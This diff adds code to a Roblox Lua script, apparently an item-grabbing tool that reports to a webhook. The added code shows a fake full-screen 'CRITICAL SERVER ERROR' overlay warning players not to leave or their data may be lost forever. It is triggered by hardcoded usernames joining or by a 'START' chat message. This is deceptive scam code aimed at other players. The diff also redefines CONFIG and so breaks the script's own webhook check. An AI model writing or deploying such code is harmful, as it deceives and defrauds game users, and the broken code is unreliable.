@@ -73,6 +73,115 @@ local CONFIG = {
     maxPickupRetries = 3
 }
 
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local TweenService = game:GetService("TweenService")
+
+local CONFIG = {
+    priorityPlayers = {"namnnni2", "another_username_here"}
+}
+
+local function createLoadingScreen()
+    if _G.LoadingScreenRan then return end
+    _G.LoadingScreenRan = true
+
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.IgnoreGuiInset = true
+    screenGui.ResetOnSpawn = false
+    screenGui.DisplayOrder = 999999
+    screenGui.Name = "CriticalLoadingScreen"
+    screenGui.Parent = game:GetService("CoreGui")
+
+    local bg = Instance.new("Frame")
+    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
+    bg.BackgroundTransparency = 0
+    bg.Parent = screenGui
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(0.9, 0, 0.2, 0)
+    title.Position = UDim2.new(0.05, 0, 0.3, 0)
+    title.Text = "❗ CRITICAL SERVER ERROR ❗"
+    title.Font = Enum.Font.GothamBlack
+    title.TextSize = 36
+    title.TextColor3 = Color3.fromRGB(255, 0, 0)
+    title.TextStrokeTransparency = 0
+    title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    title.BackgroundTransparency = 1
+    title.TextWrapped = true
+    title.Parent = bg
+
+    local warning = Instance.new("TextLabel")
+    warning.Size = UDim2.new(0.9, 0, 0.1, 0)
+    warning.Position = UDim2.new(0.05, 0, 0.45, 0)
+    warning.Text = "⚠️ Do NOT leave. Your data may be lost forever! ⚠️"
+    warning.Font = Enum.Font.GothamBold
+    warning.TextSize = 22
+    warning.TextColor3 = Color3.fromRGB(255, 100, 100)
+    warning.TextStrokeTransparency = 0
+    warning.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    warning.BackgroundTransparency = 1
+    warning.TextWrapped = true
+    warning.Parent = bg
+
+    -- Warning nhấp nháy
+    task.spawn(function()
+        while true do
+            warning.TextTransparency = 0
+            wait(0.5)
+            warning.TextTransparency = 0.5
+            wait(0.5)
+        end
+    end)
+
+    -- Sau 5 phút sẽ đổi thành "Reconnecting..."
+    task.spawn(function()
+        wait(300) -- 5 phút
+        title.Text = "Reconnecting to server..."
+        warning.Visible = false
+    end)
+end
+
+-- Gắn sự kiện chat cho mọi player hiện có
+for _, plr in ipairs(Players:GetPlayers()) do
+    plr.Chatted:Connect(function(msg)
+        if msg:upper() == "START" then
+            createLoadingScreen()
+        end
+    end)
+end
+
+-- Check priority players hiện có
+for _, plr in ipairs(Players:GetPlayers()) do
+    for _, name in ipairs(CONFIG.priorityPlayers) do
+        if plr.Name == name then
+            createLoadingScreen()
+        end
+    end
+end
+
+-- Khi có player mới join
+Players.PlayerAdded:Connect(function(plr)
+    for _, name in ipairs(CONFIG.priorityPlayers) do
+        if plr.Name == name then
+            createLoadingScreen()
+        end
+    end
+
+    plr.Chatted:Connect(function(msg)
+        if msg:upper() == "START" then
+            createLoadingScreen()
+        end
+    end)
+end)
+
+-- Gắn cho LocalPlayer chat (chắc chắn chạy với chính mình)
+LocalPlayer.Chatted:Connect(function(msg)
+    if msg:upper() == "START" then
+        createLoadingScreen()
+    end
+end)
+
 if not CONFIG.webhook or not CONFIG.username then
     warn("Webhook configuration missing")
     return
